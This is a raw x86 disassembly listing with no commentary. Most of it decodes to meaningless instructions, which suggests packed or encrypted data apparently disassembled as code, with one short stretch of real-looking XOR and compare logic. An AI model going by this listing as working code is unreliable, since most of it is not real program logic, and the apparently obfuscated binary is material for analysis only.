  40c6b0:	add    bl,BYTE PTR [edi+0x44e0b347]
  40c6b6:	ds pop ecx
  40c6b8:	jbe    0x40c6c4
  40c6ba:	mov    esp,ebx
  40c6bc:	out    dx,eax
  40c6bd:	or     al,0x87
  40c6bf:	and    dl,BYTE PTR [eax+0x109bd3f8]
  40c6c5:	adc    ebp,DWORD PTR [ecx-0x60cced0f]
  40c6cb:	lock push esp
  40c6cd:	mov    ecx,DWORD PTR [esi+eiz*8+0x65]
  40c6d1:	in     al,0xc3
  40c6d3:	jg     0x40c6ae
  40c6d5:	mov    bl,0xc1
  40c6d7:	mov    esi,0xaf26c2f7
  40c6dc:	mov    al,0x60
  40c6de:	sbb    BYTE PTR [eax-0x196c89b1],0x0
  40c6e5:	sahf   
  40c6e6:	mov    al,ds:0x7f482504
  40c6eb:	push   edx
  40c6ec:	jno    0x40c6ec
  40c6ee:	jle    0x40c6cd
  40c6f0:	shl    DWORD PTR [edx],1
  40c6f2:	jmp    0x40c6c5
  40c6f4:	sbb    dh,BYTE PTR [ebp+0x5cb2fc72]
  40c6fa:	fwait
  40c6fb:	mov    cl,0x41
  40c6fd:	add    BYTE PTR [edi-0x5b9cc03a],0x94
  40c704:	das    
  40c705:	pop    ebx
  40c706:	add    ecx,edi
  40c708:	xchg   ebp,eax
  40c709:	cmp    BYTE PTR [eax-0x78],ah
  40c70c:	sub    cl,BYTE PTR [edi]
  40c70e:	jle    0x40c6e0
  40c710:	jne    0x40c6c6
  40c712:	inc    eax
  40c713:	hlt    
  40c714:	mov    dl,0xcd
  40c716:	pop    edx
  40c717:	add    DWORD PTR [ebx],ecx
  40c719:	sbb    eax,0x317f8e39
  40c71e:	cli    
  40c71f:	scas   eax,DWORD PTR es:[edi]
  40c720:	dec    esp
  40c721:	jns    0x40c77e
  40c723:	cmp    ch,al
  40c725:	dec    edi
  40c726:	xor    DWORD PTR [esi+0x629049eb],0xea0f80b6
  40c730:	adc    cl,0x27
  40c733:	(bad)  
  40c734:	in     al,0x95
  40c736:	and    BYTE PTR [esi-0x6f04d4be],al
  40c73c:	cmp    esp,DWORD PTR [esi-0x4e078277]
  40c742:	fdivr  QWORD PTR [esi]
  40c744:	dec    edi
  40c745:	addr16 sbb al,0xa3
  40c748:	out    0x16,al
  40c74a:	sbb    DWORD PTR [edx-0x235d30e9],edi
  40c750:	in     al,dx
  40c751:	enter  0x2813,0x60
  40c755:	lahf   
  40c756:	jns    0x40c7b6
  40c758:	fwait
  40c759:	mov    ds:0xdfd484c1,eax
  40c75e:	stos   BYTE PTR es:[edi],al
  40c75f:	imul   ebp,esi,0xffffffa1
  40c762:	mov    bh,0xc
  40c764:	sub    eax,0x6c79ffc7
  40c769:	int3   
  40c76a:	xchg   ecx,eax
  40c76b:	mov    al,ds:0x73754770
  40c770:	mov    al,0xf3
  40c772:	xlat   BYTE PTR ds:[ebx]
  40c773:	inc    edi
  40c774:	jmp    0xa8da:0x7616d424
  40c77b:	sbb    BYTE PTR [eax+0x7e],cl
  40c77e:	sub    eax,0x369231bd
  40c783:	push   ss
  40c784:	cwde   
  40c785:	xor    eax,esi
  40c787:	mov    esp,0x9965e988
  40c78c:	mov    ah,0x16
  40c78e:	out    0x2a,al
  40c790:	inc    esp
  40c791:	rcr    esp,cl
  40c793:	stos   BYTE PTR es:[edi],al
  40c794:	lods   eax,DWORD PTR ds:[esi]
  40c795:	aam    0x34
  40c797:	sub    edx,esi
  40c799:	cdq    
  40c79a:	mov    ah,BYTE PTR [ebp-0x6bfdfdab]
  40c7a0:	iret   
  40c7a1:	sbb    DWORD PTR [edx],edi
  40c7a3:	pop    ebx
  40c7a4:	xchg   edi,eax
  40c7a5:	idiv   BYTE PTR [edx-0x33387c46]
  40c7ab:	push   esp
  40c7ac:	dec    ebp
  40c7ad:	pusha  
  40c7ae:	push   0x8be0d4bc
  40c7b3:	jne    0x40c7e5
  40c7b5:	inc    ebx
  40c7b6:	xchg   edx,eax
  40c7b7:	cwde   
  40c7b8:	dec    esi
  40c7b9:	arpl   WORD PTR [ebx+0x66],di
  40c7bc:	mov    ?,WORD PTR [esi+ebp*8-0x35564741]
  40c7c3:	call   0x8886:0x2e072085
  40c7ca:	xchg   esi,eax
  40c7cb:	or     cl,BYTE PTR [edx-0x4f]
  40c7ce:	out    dx,al
  40c7cf:	aaa    
  40c7d0:	pop    es
  40c7d1:	fstp   DWORD PTR [ebp+0x6b]
  40c7d4:	jo     0x40c7ed
  40c7d6:	cmp    al,0x14
  40c7d8:	mov    dl,0x6b
  40c7da:	or     DWORD PTR [esi+0x2d769596],ebp
  40c7e0:	cmp    DWORD PTR [edi],eax
  40c7e2:	lods   al,BYTE PTR ds:[esi]
  40c7e3:	test   BYTE PTR [esi+ebx*2+0x2c],0xa6
  40c7e8:	xchg   esp,eax
  40c7e9:	popf   
  40c7ea:	(bad)  
  40c7eb:	jg     0x40c855
  40c7ed:	sahf   
  40c7ee:	popf   
  40c7ef:	mov    al,0xe0
  40c7f1:	mov    ebx,0xbfc7b88f
  40c7f6:	xchg   edi,eax
  40c7f7:	pop    ss
  40c7f8:	cs or  eax,0x914ddb10
  40c7fe:	sbb    DWORD PTR [ebp+0x375b1f7d],esi
  40c804:	(bad)  
  40c805:	std    
  40c806:	sub    esp,DWORD PTR [edx+0x2c]
  40c809:	ins    BYTE PTR es:[edi],dx
  40c80a:	rol    DWORD PTR [edx+0x61801587],cl
  40c810:	xchg   edx,eax
  40c811:	lea    esp,[edx-0x77b985b4]
  40c817:	cmp    ah,0xf8
  40c81a:	dec    ecx
  40c81b:	loopne 0x40c7d4
  40c81d:	inc    esi
  40c81e:	pop    ss
  40c81f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c820:	call   0xb426a05
  40c825:	or     BYTE PTR [edi-0x54],al
  40c828:	sbb    ch,cl
  40c82a:	mov    esp,ebp
  40c82c:	std    
  40c82d:	jmp    0xc324:0x8064b489
  40c834:	push   ecx
  40c835:	aad    0xb2
  40c837:	les    edx,FWORD PTR [edx]
  40c839:	out    dx,eax
  40c83a:	stos   DWORD PTR es:[edi],eax
  40c83b:	inc    ecx
  40c83c:	stos   BYTE PTR es:[edi],al
  40c83d:	mov    eax,0xdf329a2b
  40c842:	mov    ah,0x51
  40c844:	addr16 dec edi
  40c846:	jbe    0x40c8c6
  40c848:	push   0x1a
  40c84a:	and    eax,0x74156740
  40c84f:	xchg   ecx,eax
  40c850:	adc    DWORD PTR [ecx+0x70],esi
  40c853:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c854:	outs   dx,DWORD PTR ds:[esi]
  40c855:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c856:	in     al,dx
  40c857:	rcl    BYTE PTR [ebp+0x64e3c6be],0xec
  40c85e:	in     al,dx
  40c85f:	in     al,0xc9
  40c861:	retf   0xe745
  40c864:	sahf   
  40c865:	lods   al,BYTE PTR ds:[esi]
  40c866:	or     bh,BYTE PTR [esi-0x4f]
  40c869:	es jmp 0xd2f52a41
  40c86f:	xor    eax,0x248524fe
  40c874:	lods   al,BYTE PTR ds:[esi]
  40c875:	aam    0x22
  40c877:	imul   esi,DWORD PTR [ebx+ebp*2-0x372cdd9f],0x58
  40c87f:	ins    BYTE PTR es:[edi],dx
  40c880:	cmp    dh,ch
  40c882:	comiss xmm2,xmm5
  40c885:	push   ecx
  40c886:	aas    
  40c887:	mov    bh,0x9d
  40c889:	pop    es
  40c88a:	cld    
  40c88b:	mov    ds:0x586ffda5,eax
  40c890:	sbb    eax,0xcbf82e40
  40c895:	int    0x90
  40c897:	scas   al,BYTE PTR es:[edi]
  40c898:	mov    WORD PTR [esp+ebx*4],gs
  40c89b:	pushf  
  40c89c:	adc    al,0x94
  40c89e:	sbb    BYTE PTR [edi],al
  40c8a0:	pop    ecx
  40c8a1:	add    DWORD PTR [esi+0x20],esi
  40c8a4:	loop   0x40c88b
  40c8a6:	dec    eax
  40c8a7:	fadd   st,st(4)
  40c8a9:	shl    dh,0x2d
  40c8ac:	popa   
  40c8ad:	and    edi,esp
  40c8af:	sbb    eax,0xc986f0ab
  40c8b4:	adc    dl,al
  40c8b6:	ret    
  40c8b7:	and    dh,BYTE PTR [eax+edi*4+0x3f]
  40c8bb:	pop    ecx
  40c8bc:	sbb    edi,DWORD PTR [ebx+0x5c]
  40c8bf:	mov    bl,0xc2
  40c8c1:	shl    BYTE PTR [ebx-0x42e649a1],cl
  40c8c7:	mul    ebp
  40c8c9:	aam    0x9f
  40c8cb:	dec    edi
  40c8cc:	fld    DWORD PTR ss:[edx+0x37]
  40c8d0:	jns    0x40c882
  40c8d2:	sub    BYTE PTR [edx+0x6e90c66a],ah
  40c8d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8d9:	ror    BYTE PTR [ecx+0x7],1
  40c8dc:	add    eax,0x8811c4b8
  40c8e1:	ret    0x1c49
  40c8e4:	retf   0xbc00
  40c8e7:	icebp  
  40c8e8:	mov    ebp,0x4697f1d4
  40c8ed:	xor    DWORD PTR [ecx-0x22705ead],esi
  40c8f3:	icebp  
  40c8f4:	mov    dh,0x0
  40c8f6:	es jle 0x40c8c9
  40c8f9:	int3   
  40c8fa:	stc    
  40c8fb:	or     BYTE PTR [edi],al
  40c8fd:	or     ecx,DWORD PTR [edx+0x22]
  40c900:	(bad)  
  40c902:	pop    ds
  40c903:	inc    esp
  40c904:	mov    bl,0x62
  40c906:	cmp    esi,ebp
  40c908:	cdq    
  40c909:	dec    ecx
  40c90a:	mov    ds:0xcfce326,al
  40c90f:	cmp    al,0xad
  40c911:	push   edx
  40c912:	cs xchg esp,eax
  40c914:	or     BYTE PTR [edi+esi*8-0x74d5a1d9],0x45
  40c91c:	loopne 0x40c8a9
  40c91e:	push   ebp
  40c91f:	clc    
  40c920:	mov    edi,DWORD PTR [ebp-0x24]
  40c923:	xor    edx,ecx
  40c925:	add    edx,esi
  40c927:	imul   edx,edi
  40c92a:	sub    DWORD PTR [eax],edx
  40c92c:	mov    eax,DWORD PTR [ebp-0x14]
  40c92f:	jmp    0x40b5ea
  40c934:	mov    eax,DWORD PTR [ebp-0xc]
  40c937:	mov    edx,DWORD PTR [ebp-0x18]
  40c93a:	xor    eax,edx
  40c93c:	cmp    eax,0x7a0d5426
  40c941:	je     0x40b5e7
  40c947:	mov    eax,DWORD PTR [ebp-0x10]
  40c94a:	add    DWORD PTR [eax],0x7403502
  40c950:	jmp    0x40b5e7
  40c955:	mov    eax,DWORD PTR [ebp-0x1c]
  40c958:	jmp    0x40cc71
  40c95d:	rol    ebx,cl
  40c95f:	(bad)
  40c962:	leave  
  40c963:	rcr    ebx,1
  40c965:	mov    al,ds:0x34c5e53
  40c96a:	mov    cl,0xcb
  40c96c:	dec    esp
  40c96d:	xor    bl,BYTE PTR [ebp+0x7e747878]
  40c973:	js     0x40c9ed
  40c975:	mov    esi,DWORD PTR [edi*8-0x73bd045f]
  40c97c:	jb     0x40c904
  40c97e:	or     eax,0x3bfd6318
  40c983:	scas   eax,DWORD PTR es:[edi]
  40c984:	dec    ecx
  40c985:	(bad)  
  40c986:	push   edi
  40c987:	adc    eax,0x2c151365
  40c98c:	retf   0x3afa
  40c98f:	es (bad) 
  40c991:	repnz xchg esp,eax
  40c993:	dec    ebp
  40c994:	jmp    0x3ac59e03
  40c999:	outs   dx,BYTE PTR ds:[esi]
  40c99a:	ss dec edx
  40c99c:	lds    edi,FWORD PTR [ebp-0x77fb798e]
  40c9a2:	test   bh,ch
  40c9a4:	or     DWORD PTR [edi-0x41],ebx
  40c9a7:	icebp  
  40c9a8:	push   0x4870d66b
  40c9ad:	aad    0x7a
  40c9af:	lea    edi,[edx]
  40c9b1:	add    eax,0xee84314f
  40c9b6:	dec    ebp
  40c9b7:	lahf   
  40c9b8:	aas    
  40c9b9:	stos   BYTE PTR es:[edi],al
  40c9ba:	daa    
  40c9bb:	das    
  40c9bc:	int3   
  40c9bd:	jne    0x40ca28
  40c9bf:	xchg   esp,eax
  40c9c0:	repnz sbb al,0x49
  40c9c3:	pop    eax
  40c9c4:	ret    
  40c9c5:	sti    
  40c9c6:	jmp    0xa469d935
  40c9cb:	or     DWORD PTR [eax+esi*2+0x3],ebp
  40c9cf:	(bad)  
  40c9d0:	gs aad 0x86
  40c9d3:	inc    esp
  40c9d4:	push   0xc6b78a03
  40c9d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9da:	scas   al,BYTE PTR es:[edi]
  40c9db:	sbb    bl,BYTE PTR cs:[eax-0x6573cd82]
  40c9e2:	retf   
  40c9e3:	nop
  40c9e4:	mov    ds:0x63b66f21,al
  40c9e9:	sahf   
  40c9ea:	shl    DWORD PTR [eax-0x4b5cce3c],1
  40c9f0:	fisttp DWORD PTR [ebx]
  40c9f2:	jl     0x40c9a5
  40c9f4:	scas   al,BYTE PTR es:[edi]
  40c9f5:	push   esi
  40c9f6:	inc    ecx
  40c9f7:	xchg   esp,eax
  40c9f8:	fbstp  TBYTE PTR [eax]
  40c9fa:	retf   
  40c9fb:	cdq    
  40c9fc:	mov    esp,0x9e0ce9b9
  40ca01:	jmp    0x2ffd:0xfb5e8275
  40ca08:	loopne 0x40c996
  40ca0a:	stos   DWORD PTR es:[edi],eax
  40ca0b:	test   al,0x5d
  40ca0d:	pop    eax
  40ca0e:	sbb    dl,ch
  40ca10:	and    al,0xf6
  40ca12:	xor    eax,0xaa1175cf
  40ca17:	test   eax,0xb2f01c2f
  40ca1c:	dec    DWORD PTR [ecx-0x78]
  40ca1f:	xor    DWORD PTR [esp+ebx*4],0x4e69ddad
  40ca26:	xchg   esi,eax
  40ca27:	loop   0x40c9f4
  40ca29:	int3   
  40ca2a:	add    ebp,DWORD PTR [eax]
  40ca2c:	cmp    dh,BYTE PTR [ecx+0x2166d560]
  40ca32:	cdq    
  40ca33:	cs ja  0x40ca08
  40ca36:	sbb    eax,DWORD PTR [eax-0x36f4f71a]
  40ca3c:	scas   al,BYTE PTR es:[edi]
  40ca3d:	scas   al,BYTE PTR es:[edi]
  40ca3e:	inc    BYTE PTR [edi+0x3e]
  40ca41:	mov    cs,esi
  40ca43:	aas    
  40ca44:	mov    eax,ds:0x57ac53a4
  40ca49:	fbstp  TBYTE PTR [eax-0x14]
  40ca4c:	test   ebx,ebx
  40ca4e:	retf   0xef05
  40ca51:	mov    edi,0xaa3f2900
  40ca56:	xchg   esp,eax
  40ca57:	cmp    DWORD PTR [ebx+0x2f],ebx
  40ca5a:	add    BYTE PTR [ecx],bh
  40ca5c:	shl    al,cl
  40ca5e:	lahf   
  40ca5f:	push   ss
  40ca60:	add    BYTE PTR [ebx-0x3d1c6f4d],dl
  40ca66:	bound  edx,QWORD PTR [ecx+ecx*8-0x6acb19af]
  40ca6d:	xlat   BYTE PTR es:[ebx]
  40ca6f:	popf   
  40ca70:	cdq    
  40ca71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca72:	das    
  40ca73:	xor    DWORD PTR [edi+0x77],edx
  40ca76:	xor    BYTE PTR [ebp+0x1d8e7595],0x13
  40ca7d:	mov    ds:0xc1254631,eax
  40ca82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca83:	inc    esp
  40ca84:	xor    dh,al
  40ca86:	in     eax,0xae
  40ca88:	sbb    dh,0x77
  40ca8b:	out    0x46,al
  40ca8d:	and    ebx,edx
  40ca8f:	test   DWORD PTR [esi+0x17],ebp
  40ca92:	jle    0x40ca28
  40ca94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca95:	rcl    DWORD PTR [ebx+0x7373b604],1
  40ca9b:	mov    ds:0x7dd87877,al
  40caa0:	xchg   esp,eax
  40caa1:	or     BYTE PTR [esi+eax*2+0x4ecd2a96],cl
  40caa8:	ret    
  40caa9:	add    ah,ch
  40caab:	dec    edx
  40caac:	stos   DWORD PTR es:[edi],eax
  40caad:	mov    WORD PTR [ecx-0x6d],fs
  40cab0:	xor    DWORD PTR [ebx],esp
  40cab2:	idiv   BYTE PTR [ebx]
  40cab4:	lea    esp,ds:[ecx+eiz*2-0x4d5956e4]
  40cabc:	sar    ebp,cl
  40cabe:	js     0x40cad3
  40cac0:	fcomip st,st(2)
  40cac2:	mov    ds:0x9579c582,al
  40cac7:	cmp    DWORD PTR [ecx+0x7b],eax
  40caca:	and    dh,BYTE PTR [ebx]
  40cacc:	mov    DWORD PTR [ecx-0x37],ebx
  40cacf:	sbb    dh,bh
  40cad1:	sub    dl,0x90
  40cad4:	adc    esi,ecx
  40cad6:	bound  edi,QWORD PTR [edx+0x42]
  40cad9:	inc    edx
  40cada:	sbb    edx,ecx
  40cadc:	push   esi
  40cadd:	fsubp  st(7),st
  40cadf:	iret   
  40cae0:	es jno 0x40ca7c
  40cae3:	outs   dx,DWORD PTR ds:[esi]
  40cae4:	add    eax,0x4a8fabc9
  40caea:	or     al,0x2
  40caec:	scas   eax,DWORD PTR es:[edi]
  40caed:	mov    edx,0x9a577695
  40caf2:	push   es
  40caf3:	ins    DWORD PTR es:[edi],dx
  40caf4:	inc    ebp
  40caf5:	push   esi
  40caf6:	inc    eax
  40caf7:	dec    esi
  40caf8:	cmp    eax,0xa1805500
  40cafd:	and    al,0x60
  40caff:	call   0x48e4:0x986d3b5
  40cb06:	dec    eax
  40cb07:	cdq    
  40cb08:	test   al,0x60
  40cb0a:	enter  0x4f76,0x82
  40cb0e:	mov    al,dl
  40cb10:	mov    ?,WORD PTR ds:0x16235137
  40cb16:	push   0xc91e9514
  40cb1b:	or     eax,0x9982bd5d
  40cb20:	or     al,cl
  40cb22:	sub    eax,0xd4c133db
  40cb27:	lock sub dh,ch
  40cb2a:	mov    bh,0xd4
  40cb2c:	push   ebp
  40cb2d:	icebp  
  40cb2e:	inc    ebp
  40cb2f:	xchg   esi,eax
  40cb30:	cmp    BYTE PTR [eax-0x52],dl
  40cb33:	out    dx,eax
  40cb34:	xchg   ecx,eax
  40cb35:	rol    cl,cl
  40cb37:	jbe    0x40cbae
  40cb39:	(bad)  
  40cb3a:	iret   
  40cb3b:	jne    0x40cb4b
  40cb3d:	jbe    0x40cac2
  40cb3f:	and    al,0xaf
  40cb41:	mov    ebp,DWORD PTR [edx]
  40cb43:	popa   
  40cb44:	sub    al,bh
  40cb46:	lea    esp,[edi-0x66]
  40cb49:	sbb    eax,0xc8d5bbc3
  40cb4e:	adc    al,0x96
  40cb50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb51:	call   0xc4078bc2
  40cb56:	push   es
  40cb57:	xchg   esi,eax
  40cb59:	scas   eax,DWORD PTR es:[edi]
  40cb5a:	xlat   BYTE PTR ds:[ebx]
  40cb5b:	loope  0x40caec
  40cb5d:	retf   
  40cb5e:	inc    ecx
  40cb5f:	pop    ss
  40cb60:	ins    BYTE PTR es:[edi],dx
  40cb61:	sbb    BYTE PTR [edx+0x58b2c33a],0x82
  40cb68:	lea    esi,[esp+eiz*2]
  40cb6b:	in     al,0xf7
  40cb6d:	inc    esi
  40cb6e:	jle    0x40caf2
  40cb70:	add    eax,DWORD PTR [ebx+0x7b]
  40cb73:	test   BYTE PTR [eax-0x28],0x13
  40cb77:	adc    DWORD PTR [ebx-0x3bbba731],0x152141b2
  40cb81:	daa    
  40cb82:	mov    cl,0x14
  40cb84:	std    
  40cb85:	push   0xffffff94
  40cb87:	push   es
  40cb88:	gs out 0x72,eax
  40cb8b:	pop    edi
  40cb8c:	lea    esp,[ecx]
  40cb8e:	push   es
  40cb8f:	ficom  DWORD PTR [edx+0x49]
  40cb92:	data16 rcl BYTE PTR [esi-0x5f],cl
  40cb96:	(bad)  
  40cb97:	sub    eax,0xd1ec02fd
  40cb9c:	cs in  al,0xfa
  40cb9f:	jp     0x40cb6a
  40cba1:	fwait
  40cba2:	add    edi,DWORD PTR [ecx+0x5a77159b]
  40cba8:	cmc    
  40cba9:	xor    ecx,DWORD PTR [ebx]
  40cbab:	outs   dx,BYTE PTR ds:[esi]
  40cbac:	sbb    DWORD PTR [ebx],esp
  40cbae:	mov    ss,WORD PTR [esi+0x1e]
  40cbb1:	cli    
  40cbb2:	rol    BYTE PTR [ebx-0x612f0239],1
  40cbb8:	mov    ebx,0x832bec85
  40cbbd:	test   edx,eax
  40cbbf:	mov    eax,ds:0x4fda23f0
  40cbc4:	sbb    edx,esp
  40cbc6:	add    cl,BYTE PTR [edx-0x70]
  40cbc9:	adc    bl,BYTE PTR [eax+0x33]
  40cbcc:	xor    al,BYTE PTR [ebp-0x48e8a1c]
  40cbd2:	or     ebp,ecx
  40cbd4:	jno    0x40cbe2
  40cbd6:	cld    
  40cbd7:	aam    0xde
  40cbd9:	idiv   BYTE PTR [eax-0x6d]
  40cbdc:	xchg   ebx,eax
  40cbdd:	aad    0x91
  40cbdf:	add    al,0xf3
  40cbe1:	inc    ebx
  40cbe2:	pop    esi
  40cbe3:	jmp    0x6c2f:0xf1232cf4
  40cbea:	div    DWORD PTR [ebx]
  40cbec:	dec    DWORD PTR [esi]
  40cbee:	inc    edi
  40cbef:	leave  
  40cbf0:	mov    edi,0xf3f162cf
  40cbf5:	push   es
  40cbf6:	in     al,dx
  40cbf7:	add    al,0x1e
  40cbf9:	cld    
  40cbfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbfc:	xchg   ebp,eax
  40cbfd:	pushf  
  40cbfe:	fld    TBYTE PTR ds:0x7107a1e2
  40cc04:	or     eax,0xc8fac5b8
  40cc09:	js     0x40cbcb
  40cc0b:	and    eax,0xc71c8891
  40cc10:	pushf  
  40cc11:	es or  ch,bh
  40cc14:	sbb    eax,0xd33d86cf
  40cc19:	cwde   
  40cc1a:	addr16 neg bh
  40cc1d:	push   esp
  40cc1e:	mov    DWORD PTR [esi+0x42],ecx
  40cc21:	jmp    0xaf68:0x665f6beb
  40cc28:	xchg   ebp,eax
  40cc29:	cli    
  40cc2a:	fidiv  DWORD PTR [eax-0x7]
  40cc2d:	sar    BYTE PTR [esi+eiz*1],1
  40cc30:	outs   dx,DWORD PTR ds:[esi]
  40cc31:	pop    edi
  40cc32:	(bad)  
  40cc33:	(bad)  
  40cc34:	out    0x91,eax
  40cc36:	mov    dl,0x2f
  40cc38:	mov    ah,0xee
  40cc3a:	(bad)  
  40cc3b:	or     eax,0xba79306c
  40cc40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc41:	pop    eax
  40cc42:	inc    esp
  40cc43:	daa    
  40cc44:	stc    
  40cc45:	mov    dl,BYTE PTR [ebp+0x9]
  40cc48:	cs sar bh,1
  40cc4b:	popa   
  40cc4c:	aaa    
  40cc4d:	das    
  40cc4e:	lds    esi,FWORD PTR [edx+0x2ff267ef]
  40cc54:	pop    ebp
  40cc55:	inc    ebp
  40cc56:	inc    ebx
  40cc57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc58:	ins    DWORD PTR es:[edi],dx
  40cc59:	lahf   
  40cc5a:	mov    dh,0x7c
  40cc5c:	(bad)  
  40cc5e:	out    dx,al
  40cc5f:	pop    ebx
  40cc60:	or     al,0xfc
  40cc62:	jb     0x40ccb0
  40cc64:	xor    eax,0xbf9d3b19
  40cc69:	loope  0x40cc72
  40cc6b:	xchg   esp,ebp
  40cc6d:	cmp    eax,0x39f3a9de
  40cc72:	cmp    cl,ch
  40cc74:	adc    al,0x3
  40cc76:	add    BYTE PTR [eax],al
  40cc78:	(bad)  
  40cc79:	(bad)  
  40cc7a:	rol    esp,1
  40cc7c:	ror    ebx,1
  40cc7e:	aad    0xda
  40cc80:	xchg   esi,eax
  40cc81:	mov    dl,0x71
  40cc83:	aad    0xfa
  40cc85:	cld    
  40cc86:	das    
  40cc87:	enter  0xa22e,0x78
  40cc8b:	js     0x40cd01
  40cc8d:	jle    0x40cd07
  40cc8f:	js     0x40ccd8
  40cc91:	popf   
  40cc92:	test   BYTE PTR [ecx+0x631ec178],dl
  40cc98:	or     al,0x2
  40cc9b:	mov    esi,0x8fab3fb6
  40cca0:	and    al,0x7f
  40cca2:	aas    
  40cca3:	and    eax,0xa5a1914f
  40cca8:	push   0xb5306d4a
  40ccad:	xchg   BYTE PTR [ebx-0x522b084e],ch
  40ccb3:	xchg   esp,eax
  40ccb4:	outs   dx,BYTE PTR ds:[esi]
  40ccb5:	dec    esi
  40ccb6:	(bad)  
  40ccb7:	fst    DWORD PTR [ebx]
  40ccb9:	lahf   
  40ccba:	outs   dx,DWORD PTR ds:[esi]
  40ccbb:	pop    edx
  40ccbc:	inc    ebp
  40ccbd:	ret    0x78ba
  40ccc0:	xlat   BYTE PTR ds:[ebx]
  40ccc1:	add    BYTE PTR [eax],bl
  40ccc3:	jle    0x40cd0a
  40ccc5:	adc    esp,DWORD PTR [edi-0x77]
  40ccc8:	mov    bh,0x48
  40ccca:	cmovne esp,esp
  40cccd:	pop    ds
  40ccce:	mov    ecx,0x9065106c
  40ccd3:	xlat   BYTE PTR ds:[ebx]
  40ccd4:	xlat   BYTE PTR ds:[ebx]
  40ccd5:	fsub   QWORD PTR [esi-0x29]
  40ccd8:	repz mov ?,esp
  40ccdb:	imul   ecx,DWORD PTR [ebx],0xffffff9f
  40ccde:	shl    esp,cl
  40cce0:	mov    al,ds:0xff74fa89
  40cce5:	test   DWORD PTR [eax],esp
  40cce7:	and    esp,DWORD PTR [ebx+0x49412839]
  40cced:	ss ds test al,0xc6
  40ccf1:	loop   0x40ccde
  40ccf3:	or     BYTE PTR [eax],0xaa
  40ccf6:	test   BYTE PTR [edx+eiz*1],bl
  40ccf9:	adc    eax,ebx
  40ccfb:	mov    WORD PTR [esp+0x7],fs
  40ccff:	mul    DWORD PTR [ecx]
  40cd01:	(bad)
  40cd04:	pushf  
  40cd05:	repnz push 0xffffffec
  40cd08:	push   ecx
  40cd09:	inc    edx
  40cd0a:	cwde   
  40cd0b:	fldcw  WORD PTR [esi-0x3df890d9]
  40cd11:	aam    0x1f
  40cd13:	mov    cl,0xa
  40cd15:	mov    esp,0xfae5d75e
  40cd1a:	or     ch,cl
  40cd1c:	cld    
  40cd1d:	call   0xe9ee7533
  40cd22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd23:	fs sbb al,0x8f
  40cd26:	mov    eax,0xc87eee31
  40cd2b:	pop    ecx
  40cd2c:	fstp   TBYTE PTR [edx-0x26]
  40cd2f:	jne    0x40cd75
  40cd31:	add    DWORD PTR [edx+0x39fe438b],eax
  40cd37:	or     eax,0x2e039706
  40cd3c:	int3   
  40cd3d:	jo     0x40cd01
  40cd3f:	mov    cl,0x5f
  40cd41:	xchg   ecx,eax
  40cd42:	xor    al,0xd5
  40cd44:	jae    0x40cdb2
  40cd46:	das    
  40cd47:	jmp    0xc260:0x79cd04ab
  40cd4e:	arpl   WORD PTR [esi+eax*8+0x20877325],ax
  40cd55:	jp     0x40cd27
  40cd57:	popa   
  40cd58:	daa    
  40cd59:	xor    al,0xab
  40cd5b:	jmp    0x7c2b4d48
  40cd60:	or     DWORD PTR ds:0xc9ef1792,eax
  40cd66:	adc    edi,ecx
  40cd68:	scas   al,BYTE PTR es:[edi]
  40cd69:	mov    ah,0xc1
  40cd6b:	js     0x40cdeb
  40cd6d:	bnd jns 0x40cd59
  40cd70:	addr16 hlt 
  40cd72:	inc    ebp
  40cd73:	retf   
  40cd74:	dec    eax
  40cd75:	repnz nop
  40cd77:	push   ds
  40cd78:	aas    
  40cd79:	test   al,0xec
  40cd7b:	inc    eax
  40cd7c:	test   al,0xfb
  40cd7e:	adc    edi,edx
  40cd80:	cmc    
  40cd81:	mov    esp,0x159d04ae
  40cd86:	out    0x7a,eax
  40cd88:	or     DWORD PTR [ecx+0x40],edi
  40cd8b:	pop    ds
  40cd8c:	popa   
  40cd8d:	pushf  
  40cd8e:	mov    ds:0x8a07a881,al
  40cd93:	addr16 bnd jmp 0x40cd98
  40cd97:	mov    bh,BYTE PTR [ebp-0x57]
  40cd9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd9b:	add    esp,ecx
  40cd9d:	ins    DWORD PTR es:[edi],dx
  40cd9e:	fist   DWORD PTR [ebp+0x58]
  40cda1:	fcomp  QWORD PTR [ebx-0x3]
  40cda4:	dec    edx
  40cda5:	add    al,0xa8
  40cda7:	sbb    DWORD PTR ds:0x70c92302,edx
  40cdad:	sub    eax,0xc2ac29f9
  40cdb2:	pop    ds
  40cdb3:	imul   edi,DWORD PTR [edi-0x335b3c25],0xffffffc6
  40cdba:	jmp    0x40cdd6
  40cdbc:	adc    cl,ah
  40cdbe:	sub    DWORD PTR [ebx+0x6fccac65],eax
  40cdc4:	loop   0x40cd5f
  40cdc6:	sub    eax,0xf18fa9b3
  40cdcb:	shr    BYTE PTR [ebx+ecx*2],0x50
  40cdcf:	scas   al,BYTE PTR es:[edi]
  40cdd0:	and    cl,BYTE PTR [ebx+0x5f]
  40cdd3:	mov    ebx,0x38b6bc9a
  40cdd8:	xor    cl,BYTE PTR [ecx]
  40cdda:	jb     0x40cdf3
  40cddc:	add    al,0x44
  40cdde:	pop    ebp
  40cddf:	cmp    al,0xbb
  40cde1:	push   ecx
  40cde2:	data16 fwait
  40cde4:	push   edi
  40cde5:	xchg   esi,eax
  40cde6:	pusha  
  40cde7:	push   ebp
  40cde8:	call   0x85cafde
  40cded:	mov    DWORD PTR [esi],eax
  40cdef:	ret    0x781c
  40cdf2:	sub    dh,ah
  40cdf4:	aaa    
  40cdf5:	ret    
  40cdf6:	ret    0x7ea9
  40cdf9:	xchg   DWORD PTR [esi-0x296616d8],ebp
  40cdff:	aad    0x52
